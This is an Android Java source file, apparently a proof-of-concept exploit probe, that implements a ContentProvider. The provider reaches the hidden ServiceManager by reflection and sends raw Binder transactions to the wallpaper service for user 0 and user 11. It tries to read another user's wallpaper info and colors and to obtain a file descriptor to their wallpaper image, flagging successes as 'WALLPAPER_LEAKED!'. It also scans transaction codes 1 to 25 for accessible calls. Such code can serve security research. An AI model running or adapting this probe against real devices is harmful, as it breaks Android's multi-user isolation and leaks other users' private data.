package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Bundle;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import java.lang.reflect.Method;

public class WallpaperDeepProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        probeWallpaperGetInfo(cursor);
        probeWallpaperGetColors(cursor);
        probeWallpaperGetFd(cursor);
        probeWallpaperAllTx(cursor);

        return cursor;
    }

    private void probeWallpaperGetInfo(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("wallpaper");
        if (binder == null) { cursor.addRow(new Object[]{"wallpaper", "no_binder"}); return; }
        String desc = "android.app.IWallpaperManager";

        // TX=10: getWallpaperInfo(int userId, int displayId)
        // Try multiple display IDs
        for (int userId : new int[]{0, 11}) {
            for (int displayId : new int[]{0, -1}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeInt(userId);
                    data.writeInt(displayId);
                    binder.transact(10, data, reply, 0);
                    reply.readException();
                    if (reply.readInt() != 0) {
                        // WallpaperInfo parcelable - try to read component
                        int avail = reply.dataAvail();
                        StringBuilder sb = new StringBuilder("avail=" + avail);
                        try {
                            // WallpaperInfo is backed by ResolveInfo/ServiceInfo
                            // It starts with a ComponentName (pkg + class)
                            String pkg = reply.readString();
                            String cls = reply.readString();
                            sb.append(" component=" + pkg + "/" + cls);
                        } catch (Exception e) {
                            sb.append(" parse_err:" + e.getClass().getSimpleName());
                        }
                        cursor.addRow(new Object[]{"info_u" + userId + "_d" + displayId, sb.toString()});
                    } else {
                        cursor.addRow(new Object[]{"info_u" + userId + "_d" + displayId, "null(static)"});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"info_u" + userId + "_d" + displayId, "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void probeWallpaperGetColors(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("wallpaper");
        if (binder == null) return;
        String desc = "android.app.IWallpaperManager";

        // TX=19: getWallpaperColors — try with 3 args (which, userId, displayId)
        for (int userId : new int[]{0, 11}) {
            for (int which : new int[]{1, 2}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeInt(which);
                    data.writeInt(userId);
                    data.writeInt(0); // displayId
                    binder.transact(19, data, reply, 0);
                    reply.readException();
                    if (reply.readInt() != 0) {
                        int avail = reply.dataAvail();
                        StringBuilder sb = new StringBuilder("HAS_COLORS avail=" + avail);
                        // WallpaperColors: Color primary, Color secondary, Color tertiary, int colorHints
                        try {
                            // Color is packed as int
                            int primary = reply.readInt();
                            sb.append(" primary=0x" + Integer.toHexString(primary));
                            if (reply.dataAvail() >= 4) {
                                int hints = reply.readInt();
                                sb.append(" hints=" + hints);
                            }
                        } catch (Exception ignored) {}
                        cursor.addRow(new Object[]{"colors_u" + userId + "_w" + which, sb.toString()});
                    } else {
                        cursor.addRow(new Object[]{"colors_u" + userId + "_w" + which, "null"});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"colors_u" + userId + "_w" + which, "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void probeWallpaperGetFd(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("wallpaper");
        if (binder == null) return;
        String desc = "android.app.IWallpaperManager";

        // TX=3: getWallpaper(String callingPackage, IWallpaperManagerCallback, int which,
        //        Bundle outParams, int wallpaperId, int userId)
        // This returns a ParcelFileDescriptor — actual wallpaper image!
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName()); // callingPackage
                data.writeStrongBinder(new Binder()); // IWallpaperManagerCallback
                data.writeInt(1); // which = FLAG_SYSTEM
                // Bundle outParams
                data.writeInt(-1); // null bundle marker = -1, or use 0 for empty
                data.writeInt(0); // wallpaperId = 0
                data.writeInt(userId);
                binder.transact(3, data, reply, 0);
                reply.readException();
                // Returns Bundle with ParcelFileDescriptor
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"wpFd_u" + userId, "avail=" + avail});
                if (avail > 0) {
                    // Try to read the PFD
                    if (reply.readInt() != 0) {
                        // ParcelFileDescriptor present
                        try {
                            ParcelFileDescriptor pfd = ParcelFileDescriptor.CREATOR.createFromParcel(reply);
                            if (pfd != null) {
                                long size = pfd.getStatSize();
                                cursor.addRow(new Object[]{"wpFd_u" + userId + "_size",
                                    "FD_OBTAINED! size=" + size + " WALLPAPER_IMAGE_LEAKED!"});
                                pfd.close();
                            }
                        } catch (Exception e) {
                            cursor.addRow(new Object[]{"wpFd_u" + userId + "_parse", "fd_err:" + e.getClass().getSimpleName()});
                        }
                    } else {
                        cursor.addRow(new Object[]{"wpFd_u" + userId + "_null", "null_fd"});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wpFd_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=3 alternate: try different argument orders
        // Maybe: getWallpaper(IWallpaperManagerCallback, int which, Bundle outParams,
        //         int wallpaperId, int userId, String callingPackage)
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeStrongBinder(new Binder()); // callback first
                data.writeInt(1); // which
                Bundle b = new Bundle();
                data.writeBundle(b);
                data.writeInt(0); // wallpaperId
                data.writeInt(userId);
                data.writeString(getContext().getPackageName());
                binder.transact(3, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"wpFd2_u" + userId, "avail=" + avail});
                if (avail > 4) {
                    cursor.addRow(new Object[]{"wpFd2_u" + userId + "_data", "HAS_DATA! avail=" + avail});
                    // Try to read PFD
                    if (reply.readInt() != 0) {
                        try {
                            ParcelFileDescriptor pfd = ParcelFileDescriptor.CREATOR.createFromParcel(reply);
                            if (pfd != null) {
                                cursor.addRow(new Object[]{"wpFd2_u" + userId + "_size",
                                    "FD! size=" + pfd.getStatSize() + " WALLPAPER_LEAKED!"});
                                pfd.close();
                            }
                        } catch (Exception e2) {
                            cursor.addRow(new Object[]{"wpFd2_u" + userId + "_parse", e2.getClass().getSimpleName()});
                        }
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wpFd2_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=4: getWallpaperWithFeature — newer API variant
        // getWallpaperWithFeature(String callingPackage, IWallpaperManagerCallback, int which,
        //   Bundle outParams, int wallpaperId, int userId, int displayId)
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null); // featureId
                data.writeStrongBinder(new Binder());
                data.writeInt(1); // which
                Bundle b = new Bundle();
                data.writeBundle(b);
                data.writeInt(0); // wallpaperId
                data.writeInt(userId);
                data.writeInt(0); // displayId
                binder.transact(4, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"wpFd4_u" + userId, "avail=" + avail});
                if (avail > 4) {
                    if (reply.readInt() != 0) {
                        try {
                            ParcelFileDescriptor pfd = ParcelFileDescriptor.CREATOR.createFromParcel(reply);
                            if (pfd != null) {
                                cursor.addRow(new Object[]{"wpFd4_u" + userId + "_size",
                                    "FD! size=" + pfd.getStatSize() + " WALLPAPER_LEAKED!"});
                                pfd.close();
                            }
                        } catch (Exception e2) {
                            cursor.addRow(new Object[]{"wpFd4_u" + userId + "_parse", e2.getClass().getSimpleName()});
                        }
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wpFd4_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeWallpaperAllTx(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("wallpaper");
        if (binder == null) return;
        String desc = "android.app.IWallpaperManager";

        // Scan all TX codes with userId=11 to find accessible ones
        for (int tx = 1; tx <= 25; tx++) {
            if (tx == 3 || tx == 10 || tx == 19) continue; // already tested
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(11); // user 11
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"wp_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"wp_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.length() > 5 && !msg.contains("consumed")) {
                            cursor.addRow(new Object[]{"wp_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
